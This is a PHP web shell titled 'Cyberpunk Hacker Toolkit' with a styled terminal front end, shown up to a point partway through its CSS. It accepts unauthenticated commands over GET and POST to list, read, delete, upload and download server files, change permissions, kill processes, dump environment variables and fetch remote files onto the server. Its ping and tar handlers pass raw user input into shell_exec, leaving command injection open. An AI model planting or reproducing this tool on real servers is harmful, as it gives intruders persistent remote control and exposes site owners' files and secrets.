<?php
// Start or resume the session
session_start();

// Check if 'cmd' parameter is provided in the URL
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];

    // Map the 'cmd' parameter to the corresponding function
    switch ($command) {
        case 'ls':
            echo ls();
            break;

        case 'pwd':
            echo pwd();
            break;

        case 'sysinfo':
            echo sysinfo();
            break;

        case 'network':
            echo network();
            break;

        default:
            echo "Unknown command: $command";
            break;
    }

    exit; // Terminate script after processing the command
} elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Check if the form is submitted with a file upload
    if (isset($_FILES["fileToUpload"])) {
        $output = upload();
        echo $output;
        exit;
    }

    $command = $_POST["command"];
    $output = '';

    $parts = explode(' ', $command);
    $operation = strtolower(trim(array_shift($parts)));

    switch ($operation) {
        case 'ls':
            $output = ls();
            break;

        case 'pwd':
            $output = pwd();
            break;

        case 'cd':
            $output = cd($parts);
            break;

        case 'touch':
            $output = touchFile($parts);
            break;

        case 'rm':
            $output = remove($parts);
            break;

        case 'mkdir':
            $output = mkdirCommand($parts);
            break;

        case 'rmdir':
            $output = rmdirCommand($parts);
            break;

        case 'download':
            download($parts);
            exit;

        case 'cat':
            $output = cat($parts);
            break;

        case 'cp':
            $output = copyFile($parts);
            break;

        case 'mv':
            $output = moveFile($parts);
            break;

        case 'chmod':
            $output = chmodFile($parts);
            break;

        case 'find':
            $output = find($parts);
            break;

        case 'sysinfo':
            $output = sysinfo();
            break;

        case 'network':
            $output = network();
            break;

        case 'clear':
            $output = '';
            break;

        case 'history':
            $output = showHistory();
            break;

        case 'grep':
            $output = grep($parts);
            break;

        case 'head':
            $output = head($parts);
            break;

        case 'tail':
            $output = tail($parts);
            break;

        case 'wc':
            $output = wc($parts);
            break;

        case 'ps':
            $output = ps();
            break;

        case 'kill':
            $output = kill($parts);
            break;

        case 'ping':
            $output = ping($parts);
            break;

        case 'curl':
            $output = curl($parts);
            break;

        case 'wget':
            $output = wget($parts);
            break;

        case 'env':
            $output = env();
            break;

        case 'setenv':
            $output = setenv($parts);
            break;

        case 'getenv':
            $output = getEnvironmentVariable($parts);
            break;

        case 'tar':
            $output = tar($parts);
            break;

        case 'zip':
            $output = zip($parts);
            break;

        default:
            $output = "Unknown command: $operation. Type 'help' for available commands.";
            break;
    }

    // Output the result
    echo $output;
    exit; // Terminate execution after handling the command
}

// Add history tracking to command processing (only for POST requests)
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($operation) && isset($command)) {
    if ($operation !== 'history' && $operation !== 'clear') {
        addToHistory($command);
    }
}

function ls() {
    $files = scandir(getCurrentDirectory());
    $output = "DIRECTORY LISTING: " . getCurrentDirectory() . "\n";
    $output .= str_repeat("=", 60) . "\n";
    $output .= sprintf("%-40s %-10s %-10s\n", "NAME", "SIZE", "TYPE");
    $output .= str_repeat("-", 60) . "\n";
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $filepath = getCurrentDirectory() . '/' . $file;
        $size = is_file($filepath) ? formatBytes(filesize($filepath)) : '-';
        $type = is_dir($filepath) ? '[DIR]' : '[FILE]';
        $output .= sprintf("%-40s %-10s %-10s\n", $file, $size, $type);
    }
    return $output;
}

function formatBytes($size, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');

    for ($i = 0; $size > 1024 && $i < count($units) - 1; $i++) {
        $size /= 1024;
    }

    return round($size, $precision) . ' ' . $units[$i];
}

function pwd() {
    return getCurrentDirectory();
}

function cd($parts) {
    session_start(); // Start or resume a session

    if (!isset($_SESSION['current_directory'])) {
        $_SESSION['current_directory'] = getcwd(); // Initialize current directory
    }

    if (count($parts) > 0) {
        $directory = implode(' ', $parts);
        $currentDirectory = $_SESSION['current_directory'];

        // Handle special cases
        if ($directory === '..') {
            $parentDir = dirname($currentDirectory);
            $_SESSION['current_directory'] = $parentDir;
            return "Changed directory to: " . $_SESSION['current_directory'];
        } elseif ($directory === '~' || $directory === '/') {
            $_SESSION['current_directory'] = getcwd();
            return "Changed directory to: " . $_SESSION['current_directory'];
        }

        // Check if the target directory exists
        if (is_dir($currentDirectory . '/' . $directory)) {
            $_SESSION['current_directory'] = realpath($currentDirectory . '/' . $directory);
            return "Changed directory to: " . $_SESSION['current_directory'];
        } else {
            return "Directory not found: $directory";
        }
    } else {
        return "Usage: cd [directory]";
    }
}

function getCurrentDirectory() {
    // Check if the current directory is set in the session
    if (isset($_SESSION['current_directory'])) {
        return $_SESSION['current_directory'];
    } else {
        // If not set, use the current working directory
        return getcwd();
    }
}

function touchFile($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            return "File already exists: $filename";
        } else {
            if (touch($filepath)) {
                return "File created: $filename";
            } else {
                return "Failed to create file: $filename";
            }
        }
    } else {
        return "Usage: touch [filename]";
    }
}

function remove($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            if (is_dir($filepath)) {
                if (removeDirectory($filepath)) {
                    return "Directory removed: $filename";
                } else {
                    return "Failed to remove directory: $filename";
                }
            } else {
                if (unlink($filepath)) {
                    return "File removed: $filename";
                } else {
                    return "Failed to remove file: $filename";
                }
            }
        } else {
            return "File/Directory not found: $filename";
        }
    } else {
        return "Usage: rm [filename]";
    }
}

function mkdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath)) {
            return "Directory already exists: $dirname";
        } else {
            if (mkdir($dirpath, 0755, true)) {
                return "Directory created: $dirname";
            } else {
                return "Failed to create directory: $dirname";
            }
        }
    } else {
        return "Usage: mkdir [directory]";
    }
}

function rmdirCommand($parts) {
    if (count($parts) > 0) {
        $dirname = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $dirpath = $directory . '/' . $dirname;
        if (file_exists($dirpath) && is_dir($dirpath)) {
            if (removeDirectory($dirpath)) {
                return "Directory removed: $dirname";
            } else {
                return "Failed to remove directory: $dirname";
            }
        } else {
            return "Directory not found: $dirname";
        }
    } else {
        return "Usage: rmdir [directory]";
    }
}

function removeDirectory($dir) {
    if (!file_exists($dir) || !is_dir($dir)) return false;

    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        if (is_dir($dir . DIRECTORY_SEPARATOR . $item)) {
            if (!removeDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
        } else {
            if (!unlink($dir . DIRECTORY_SEPARATOR . $item)) return false;
        }
    }

    return rmdir($dir);
}

function download($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;

        if (file_exists($filepath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($filepath));
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filepath));
            readfile($filepath);
            exit;
        } else {
            echo "File not found: $filename";
        }
    } else {
        echo "Usage: download [filename]";
    }
}

function upload() {
    if ($_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        $filename = basename($_FILES['fileToUpload']['name']);
        $directory = getCurrentDirectory(); // Get the current directory
        $destination = $directory . '/' . $filename; // Set the destination directory

        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $destination)) {
            return "File uploaded successfully: $filename";
        } else {
            return "Failed to upload file: $filename";
        }
    } else {
        return "File upload error: " . $_FILES['fileToUpload']['error'];
    }
}

// New functions for enhanced functionality
function cat($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        if (file_exists($filepath)) {
            if (is_dir($filepath)) {
                return "Cannot display directory as file: $filename";
            } else {
                $content = file_get_contents($filepath);
                if ($content !== false) {
                    return "File: $filename\n" . str_repeat("-", 50) . "\n$content";
                } else {
                    return "Failed to read file: $filename";
                }
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: cat [filename]";
    }
}

function copyFile($parts) {
    if (count($parts) >= 2) {
        $source = $parts[0];
        $destination = $parts[1];
        $directory = getCurrentDirectory();
        $sourcePath = $directory . '/' . $source;
        $destPath = $directory . '/' . $destination;
        
        if (file_exists($sourcePath)) {
            if (copy($sourcePath, $destPath)) {
                return "File copied from '$source' to '$destination'";
            } else {
                return "Failed to copy file from '$source' to '$destination'";
            }
        } else {
            return "Source file not found: $source";
        }
    } else {
        return "Usage: cp [source] [destination]";
    }
}

function moveFile($parts) {
    if (count($parts) >= 2) {
        $source = $parts[0];
        $destination = $parts[1];
        $directory = getCurrentDirectory();
        $sourcePath = $directory . '/' . $source;
        $destPath = $directory . '/' . $destination;
        
        if (file_exists($sourcePath)) {
            if (rename($sourcePath, $destPath)) {
                return "File moved from '$source' to '$destination'";
            } else {
                return "Failed to move file from '$source' to '$destination'";
            }
        } else {
            return "Source file not found: $source";
        }
    } else {
        return "Usage: mv [source] [destination]";
    }
}

function chmodFile($parts) {
    if (count($parts) >= 2) {
        $mode = $parts[0];
        $filename = implode(' ', array_slice($parts, 1));
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;
        
        if (file_exists($filepath)) {
            // Convert octal string to decimal
            $mode = octdec(str_pad($mode, 4, '0', STR_PAD_LEFT));
            if (chmod($filepath, $mode)) {
                return "Permissions changed for '$filename' to " . decoct($mode);
            } else {
                return "Failed to change permissions for '$filename'";
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: chmod [mode] [filename]";
    }
}

function find($parts) {
    if (count($parts) > 0) {
        $searchTerm = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $results = [];
        
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        
        foreach ($iterator as $file) {
            if (strpos($file->getFilename(), $searchTerm) !== false) {
                $results[] = $file->getPathname();
            }
        }
        
        if (count($results) > 0) {
            return "Found " . count($results) . " items matching '$searchTerm':\n" . implode("\n", $results);
        } else {
            return "No items found matching '$searchTerm'";
        }
    } else {
        return "Usage: find [search_term]";
    }
}

function sysinfo() {
    $output = "SYSTEM INFORMATION\n";
    $output .= str_repeat("=", 50) . "\n";
    $output .= "OS: " . php_uname() . "\n";
    $output .= "PHP Version: " . phpversion() . "\n";
    $output .= "Server Software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
    $output .= "Server Name: " . $_SERVER['SERVER_NAME'] . "\n";
    $output .= "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\n";
    $output .= "Current Directory: " . getCurrentDirectory() . "\n";
    $output .= "Memory Usage: " . formatBytes(memory_get_usage()) . "\n";
    $output .= "Memory Peak Usage: " . formatBytes(memory_get_peak_usage()) . "\n";
    return $output;
}

function network() {
    $output = "NETWORK INFORMATION\n";
    $output .= str_repeat("=", 50) . "\n";
    $output .= "Server IP: " . $_SERVER['SERVER_ADDR'] . "\n";
    $output .= "Server Port: " . $_SERVER['SERVER_PORT'] . "\n";
    $output .= "Remote IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    $output .= "Remote Port: " . $_SERVER['REMOTE_PORT'] . "\n";
    $output .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    return $output;
}

// Enhanced command history management
function getCommandHistory() {
    if (!isset($_SESSION['command_history'])) {
        $_SESSION['command_history'] = [];
    }
    return $_SESSION['command_history'];
}

function addToHistory($command) {
    $history = getCommandHistory();
    if (!empty($command) && (empty($history) || $history[count($history)-1] !== $command)) {
        $history[] = $command;
        if (count($history) > 100) { // Keep last 100 commands
            array_shift($history);
        }
        $_SESSION['command_history'] = $history;
    }
}

function getHistoryCommand($index) {
    $history = getCommandHistory();
    if ($index >= 0 && $index < count($history)) {
        return $history[$index];
    }
    return null;
}

function showHistory() {
    $history = getCommandHistory();
    if (count($history) > 0) {
        $output = "COMMAND HISTORY:\n";
        $output .= str_repeat("=", 50) . "\n";
        foreach ($history as $index => $cmd) {
            $output .= sprintf("%3d  %s\n", $index + 1, $cmd);
        }
        return $output;
    } else {
        return "No command history available";
    }
}

// Text processing utilities
function grep($parts) {
    if (count($parts) >= 2) {
        $pattern = $parts[0];
        $filename = implode(' ', array_slice($parts, 1));
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;

        if (file_exists($filepath)) {
            $content = file_get_contents($filepath);
            if ($content !== false) {
                $lines = explode("\n", $content);
                $matches = [];
                foreach ($lines as $lineNum => $line) {
                    if (preg_match('/' . preg_quote($pattern, '/') . '/', $line)) {
                        $matches[] = ($lineNum + 1) . ": " . $line;
                    }
                }
                if (count($matches) > 0) {
                    return "GREP RESULTS for '$pattern' in $filename:\n" . implode("\n", $matches);
                } else {
                    return "No matches found for pattern '$pattern' in $filename";
                }
            } else {
                return "Failed to read file: $filename";
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: grep [pattern] [filename]";
    }
}

function head($parts) {
    $lines = 10; // Default lines
    $filename = '';

    if (count($parts) > 0) {
        if (is_numeric($parts[0])) {
            $lines = (int)$parts[0];
            $filename = count($parts) > 1 ? implode(' ', array_slice($parts, 1)) : '';
        } else {
            $filename = implode(' ', $parts);
        }
    }

    if (empty($filename)) {
        return "Usage: head [lines] [filename]";
    }

    $directory = getCurrentDirectory();
    $filepath = $directory . '/' . $filename;

    if (file_exists($filepath)) {
        $content = file_get_contents($filepath);
        if ($content !== false) {
            $lines_array = explode("\n", $content);
            $head_lines = array_slice($lines_array, 0, $lines);
            return "HEAD of $filename (first $lines lines):\n" . implode("\n", $head_lines);
        } else {
            return "Failed to read file: $filename";
        }
    } else {
        return "File not found: $filename";
    }
}

function tail($parts) {
    $lines = 10; // Default lines
    $filename = '';

    if (count($parts) > 0) {
        if (is_numeric($parts[0])) {
            $lines = (int)$parts[0];
            $filename = count($parts) > 1 ? implode(' ', array_slice($parts, 1)) : '';
        } else {
            $filename = implode(' ', $parts);
        }
    }

    if (empty($filename)) {
        return "Usage: tail [lines] [filename]";
    }

    $directory = getCurrentDirectory();
    $filepath = $directory . '/' . $filename;

    if (file_exists($filepath)) {
        $content = file_get_contents($filepath);
        if ($content !== false) {
            $lines_array = explode("\n", $content);
            $tail_lines = array_slice($lines_array, -$lines);
            return "TAIL of $filename (last $lines lines):\n" . implode("\n", $tail_lines);
        } else {
            return "Failed to read file: $filename";
        }
    } else {
        return "File not found: $filename";
    }
}

function wc($parts) {
    if (count($parts) > 0) {
        $filename = implode(' ', $parts);
        $directory = getCurrentDirectory();
        $filepath = $directory . '/' . $filename;

        if (file_exists($filepath)) {
            $content = file_get_contents($filepath);
            if ($content !== false) {
                $lines = substr_count($content, "\n") + 1;
                $words = str_word_count($content);
                $chars = strlen($content);
                return "Word count for $filename:\nLines: $lines\nWords: $words\nCharacters: $chars";
            } else {
                return "Failed to read file: $filename";
            }
        } else {
            return "File not found: $filename";
        }
    } else {
        return "Usage: wc [filename]";
    }
}

// Process management
function ps() {
    $output = "PROCESS LIST:\n";
    $output .= str_repeat("=", 60) . "\n";
    $output .= sprintf("%-10s %-10s %-15s %s\n", "PID", "USER", "MEMORY", "COMMAND");
    $output .= str_repeat("-", 60) . "\n";

    // Get current PHP processes
    $output .= sprintf("%-10s %-10s %-15s %s\n", getmypid(), get_current_user(), formatBytes(memory_get_usage()), "php (shell_v2.php)");

    // Try to get system processes if available
    if (function_exists('exec')) {
        $processes = shell_exec('ps aux 2>/dev/null | head -20');
        if ($processes) {
            $output .= "\nSYSTEM PROCESSES:\n" . $processes;
        }
    }

    return $output;
}

function kill($parts) {
    if (count($parts) >= 1) {
        $pid = $parts[0];
        if (is_numeric($pid)) {
            if (function_exists('posix_kill')) {
                if (posix_kill($pid, SIGTERM)) {
                    return "Process $pid terminated successfully";
                } else {
                    return "Failed to terminate process $pid";
                }
            } else {
                return "Process termination not available on this system";
            }
        } else {
            return "Invalid PID: $pid";
        }
    } else {
        return "Usage: kill [pid]";
    }
}

// Network utilities
function ping($parts) {
    if (count($parts) > 0) {
        $host = $parts[0];
        $count = isset($parts[1]) ? (int)$parts[1] : 4;

        if (function_exists('exec')) {
            $output = shell_exec("ping -c $count $host 2>&1");
            return "PING $host:\n$output";
        } else {
            return "Ping command not available on this system";
        }
    } else {
        return "Usage: ping [host] [count]";
    }
}

function curl($parts) {
    if (count($parts) > 0) {
        $url = $parts[0];
        $options = isset($parts[1]) ? $parts[1] : '';

        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);

            if ($options === '-I' || $options === '--head') {
                curl_setopt($ch, CURLOPT_NOBODY, true);
            }

            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);

            curl_close($ch);

            $output = "CURL $url:\n";
            $output .= "HTTP Code: $http_code\n";
            $output .= "Total Time: " . round($total_time, 2) . "s\n";
            $output .= "Response:\n$response";

            return $output;
        } else {
            return "CURL not available on this system";
        }
    } else {
        return "Usage: curl [url] [options]";
    }
}

function wget($parts) {
    if (count($parts) > 0) {
        $url = $parts[0];
        $filename = isset($parts[1]) ? $parts[1] : basename($url);

        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            $fp = fopen($filename, 'wb');

            curl_setopt($ch, CURLOPT_FILE, $fp);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

            $success = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

            curl_close($ch);
            fclose($fp);

            if ($success) {
                return "Downloaded $url to $filename (HTTP $http_code)";
            } else {
                unlink($filename); // Clean up failed download
                return "Failed to download $url";
            }
        } else {
            return "WGET functionality requires CURL";
        }
    } else {
        return "Usage: wget [url] [filename]";
    }
}

// Environment variable management
function env() {
    $output = "ENVIRONMENT VARIABLES:\n";
    $output .= str_repeat("=", 50) . "\n";

    foreach ($_ENV as $key => $value) {
        $output .= sprintf("%-30s = %s\n", $key, $value);
    }

    return $output;
}

function setenv($parts) {
    if (count($parts) >= 2) {
        $var = $parts[0];
        $value = implode(' ', array_slice($parts, 1));

        // Store in session for persistence
        $_SESSION['env_vars'][$var] = $value;

        // Set in current environment if possible
        if (function_exists('putenv')) {
            putenv("$var=$value");
        }

        return "Environment variable $var set to: $value";
    } else {
        return "Usage: setenv [variable] [value]";
    }
}

function getEnvironmentVariable($parts) {
    if (count($parts) > 0) {
        $var = implode(' ', $parts);

        // Check session first
        if (isset($_SESSION['env_vars'][$var])) {
            return "$var = " . $_SESSION['env_vars'][$var];
        }

        // Check system environment
        $value = getenv($var);
        if ($value !== false) {
            return "$var = $value";
        } else {
            return "Environment variable $var not found";
        }
    } else {
        return "Usage: getenv [variable]";
    }
}

// Archive and compression tools
function tar($parts) {
    if (count($parts) >= 2) {
        $action = $parts[0];
        $archive = $parts[1];
        $files = array_slice($parts, 2);

        if (function_exists('exec')) {
            switch ($action) {
                case 'c':
                case 'create':
                    $file_list = implode(' ', $files);
                    $output = shell_exec("tar -cf $archive $file_list 2>&1");
                    return "Created archive $archive:\n$output";

                case 'x':
                case 'extract':
                    $output = shell_exec("tar -xf $archive 2>&1");
                    return "Extracted archive $archive:\n$output";

                case 'l':
                case 'list':
                    $output = shell_exec("tar -tf $archive 2>&1");
                    return "Contents of $archive:\n$output";

                default:
                    return "Usage: tar [c|x|l] [archive.tar] [files...]";
            }
        } else {
            return "TAR command not available on this system";
        }
    } else {
        return "Usage: tar [c|x|l] [archive.tar] [files...]";
    }
}

function zip($parts) {
    if (count($parts) >= 2) {
        $action = $parts[0];
        $archive = $parts[1];
        $files = array_slice($parts, 2);

        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();

            switch ($action) {
                case 'c':
                case 'create':
                    if ($zip->open($archive, ZipArchive::CREATE) === TRUE) {
                        foreach ($files as $file) {
                            $directory = getCurrentDirectory();
                            $filepath = $directory . '/' . $file;
                            if (file_exists($filepath)) {
                                if (is_dir($filepath)) {
                                    $zip->addEmptyDir($file);
                                    addDirToZip($zip, $filepath, $file);
                                } else {
                                    $zip->addFile($filepath, $file);
                                }
                            }
                        }
                        $zip->close();
                        return "Created ZIP archive: $archive";
                    } else {
                        return "Failed to create ZIP archive: $archive";
                    }

                case 'x':
                case 'extract':
                    if ($zip->open($archive) === TRUE) {
                        $zip->extractTo(getCurrentDirectory());
                        $zip->close();
                        return "Extracted ZIP archive: $archive";
                    } else {
                        return "Failed to extract ZIP archive: $archive";
                    }

                case 'l':
                case 'list':
                    if ($zip->open($archive) === TRUE) {
                        $output = "Contents of $archive:\n";
                        for ($i = 0; $i < $zip->numFiles; $i++) {
                            $output .= $zip->getNameIndex($i) . "\n";
                        }
                        $zip->close();
                        return $output;
                    } else {
                        return "Failed to read ZIP archive: $archive";
                    }

                default:
                    return "Usage: zip [c|x|l] [archive.zip] [files...]";
            }
        } else {
            return "ZIP extension not available";
        }
    } else {
        return "Usage: zip [c|x|l] [archive.zip] [files...]";
    }
}

function addDirToZip($zip, $dir, $basePath) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $filePath = $dir . '/' . $file;
        $localPath = $basePath . '/' . $file;

        if (is_dir($filePath)) {
            $zip->addEmptyDir($localPath);
            addDirToZip($zip, $filePath, $localPath);
        } else {
            $zip->addFile($filePath, $localPath);
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cyberpunk Hacker Toolkit</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
        
        :root {
            --cyber-black: #0a0a0a;
            --cyber-red: #ff0033;
            --cyber-red-light: #ff3366;
            --cyber-red-jelly: rgba(255, 0, 51, 0.3);
            --cyber-yellow: #ffff00;
            --cyber-blue: #00ccff;
            --cyber-green: #00ff99;
            --cyber-purple: #cc00ff;
            --cyber-gray: #333333;
            --cyber-gray-light: #666666;
            --jelly-bg: rgba(255, 0, 51, 0.05);
            --jelly-border: rgba(255, 0, 51, 0.2);
            --glass-bg: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--cyber-black);
            color: #f0f0f0;
            margin: 0;
            display: flex;
            min-height: 100vh;
            overflow: hidden;
            background:
                radial-gradient(circle at 20% 30%, var(--cyber-red-jelly) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(0, 204, 255, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(255, 255, 0, 0.1) 0%, transparent 50%),
                linear-gradient(135deg, rgba(255, 0, 51, 0.03) 0%, transparent 50%),
                linear-gradient(45deg, rgba(0, 204, 255, 0.05) 0%, transparent 50%);
            position: relative;
            animation: backgroundShift 20s ease-in-out infinite alternate;
        }

        @keyframes backgroundShift {
            0% { filter: hue-rotate(0deg) brightness(1); }
            50% { filter: hue-rotate(10deg) brightness(1.1); }
            100% { filter: hue-rotate(-5deg) brightness(0.9); }
        }

        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background:
                radial-gradient(ellipse at center, transparent 0%, rgba(10, 10, 10, 0.8) 100%),
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    var(--jelly-bg) 2px,
                    var(--jelly-bg) 4px
                ),
                repeating-linear-gradient(
                    90deg,
                    transparent,
                    transparent 2px,
                    var(--jelly-bg) 2px,
                    var(--jelly-bg) 4px
                ),
                linear-gradient(45deg, rgba(255, 0, 51, 0.02) 0%, transparent 50%);
            z-index: -1;
            animation: gridPulse 8s ease-in-out infinite;
        }

        @keyframes gridPulse {
            0%, 100% { opacity: 0.7; filter: blur(0px); }
            50% { opacity: 1; filter: blur(0.5px); }
        }

        .sidebar {
            width: 280px;
            background: linear-gradient(135deg,
                rgba(20, 20, 30, 0.8) 0%,
                rgba(255, 0, 51, 0.1) 50%,
                rgba(20, 20, 30, 0.8) 100%);
            padding: 20px;
            border-right: 2px solid var(--cyber-red);
            border-right: 2px solid transparent;
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            backdrop-filter: blur(20px) saturate(180%);
            -webkit-backdrop-filter: blur(20px) saturate(180%);
            overflow-y: auto;
            height: 100vh;
            position: sticky;
            top: 0;
            display: flex;
            flex-direction: column;
            box-shadow:
                inset 0 0 50px rgba(255, 0, 51, 0.1),
                0 0 30px rgba(255, 0, 51, 0.2);
            animation: sidebarGlow 6s ease-in-out infinite alternate;
        }

        @keyframes sidebarGlow {
            0% { box-shadow: inset 0 0 50px rgba(255, 0, 51, 0.1), 0 0 30px rgba(255, 0, 51, 0.2); }
            50% { box-shadow: inset 0 0 80px rgba(255, 0, 51, 0.2), 0 0 50px rgba(255, 0, 51, 0.3); }
            100% { box-shadow: inset 0 0 60px rgba(255, 0, 51, 0.15), 0 0 40px rgba(255, 0, 51, 0.25); }
        }

        .sidebar-header {
            text-align: center;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--cyber-red);
            position: relative;
        }

        .sidebar-header h1 {
            color: var(--cyber-red);
            font-size: 18px;
            margin-bottom: 8px;
            text-shadow: 0 0 10px rgba(255, 0, 51, 0.7);
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 2px;
        }

        .sidebar-header p {
            color: var(--cyber-blue);
            font-size: 12px;
        }

        .sidebar-section {
            margin-bottom: 25px;
            padding: 15px 0;
            position: relative;
        }

        .sidebar-section:not(:last-child)::after {
            content: '';
            position: absolute;
            bottom: -15px;
            left: 20px;
            right: 20px;
            height: 1px;
            background: linear-gradient(90deg,
                transparent 0%,
                var(--cyber-red) 20%,
                var(--cyber-blue) 50%,
                var(--cyber-red) 80%,
                transparent 100%);
            opacity: 0.3;
        }

        .sidebar-section h2 {
            color: var(--cyber-yellow);
            font-size: 18px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 15px;
            background: linear-gradient(135deg,
                rgba(255, 255, 0, 0.1) 0%,
                rgba(255, 255, 0, 0.05) 100%);
            border-radius: 10px;
            border-left: 4px solid var(--cyber-yellow);
            text-shadow: 0 0 10px rgba(255, 255, 0, 0.3);
            font-weight: 700;
            letter-spacing: 1px;
        }

        .sidebar-section h2 i {
            color: var(--cyber-yellow);
            font-size: 20px;
            text-shadow: 0 0 10px rgba(255, 255, 0, 0.5);
        }

        .sidebar ul {
            list-style: none;
            padding: 0;
            font-size: 13px;
            margin: 0;
        }

        .sidebar ul li {
            margin-bottom: 15px;
            position: relative;
            padding: 8px 12px;
            background: linear-gradient(135deg,
                rgba(255, 0, 51, 0.05) 0%,
                rgba(255, 0, 51, 0.02) 100%);
            border-radius: 8px;
            border-left: 3px solid var(--cyber-red);
            transition: all 0.3s ease;
        }

        .sidebar ul li:hover {
            background: linear-gradient(135deg,
                rgba(255, 0, 51, 0.1) 0%,
                rgba(255, 0, 51, 0.05) 100%);
            border-left-color: var(--cyber-red-light);
            transform: translateX(5px);
        }

        .sidebar ul li::before {
            content: "⚡";
            position: absolute;
            left: 8px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--cyber-red);
            font-size: 12px;
            opacity: 0.7;
        }

        .sidebar ul li span.command {
            color: var(--cyber-red-light);
            font-weight: 600;
            font-family: 'Share Tech Mono', monospace;
            font-size: 14px;
            display: block;
            margin-bottom: 4px;
            text-shadow: 0 0 5px rgba(255, 0, 51, 0.3);
        }

        .sidebar ul li span.desc {
            color: #e0e0e0;
            font-size: 12px;
            display: block;
            line-height: 1.4;
            margin-left: 0;
            opacity: 0.9;
        }

        .documentation {
            font-size: 11px;
            color: #e0e0e0;
            margin-top: auto;
            padding: 20px 15px;
            background: linear-gradient(135deg,
                rgba(255, 0, 51, 0.05) 0%,
                rgba(255, 0, 51, 0.02) 100%);
            border-radius: 10px;
            border: 1px solid var(--cyber-red);
            border-image: linear-gradient(135deg, var(--cyber-red), var(--cyber-blue)) 1;
            text-align: center;
            line-height: 1.5;
            opacity: 0.9;
        }

        .documentation::before {
            content: "⚠️";
            font-size: 14px;
            display: block;
            margin-bottom: 8px;
            color: var(--cyber-yellow);
        }

        .terminal-container {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        .terminal-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(ellipse at center, rgba(255, 0, 51, 0.05) 0%, transparent 70%);
            pointer-events: none;
            z-index: -1;
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid var(--cyber-red);
        }

        .terminal-header h2 {
            color: var(--cyber-red);
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Orbitron', sans-serif;
        }

        .terminal-header-buttons {
            display: flex;
            gap: 10px;
        }

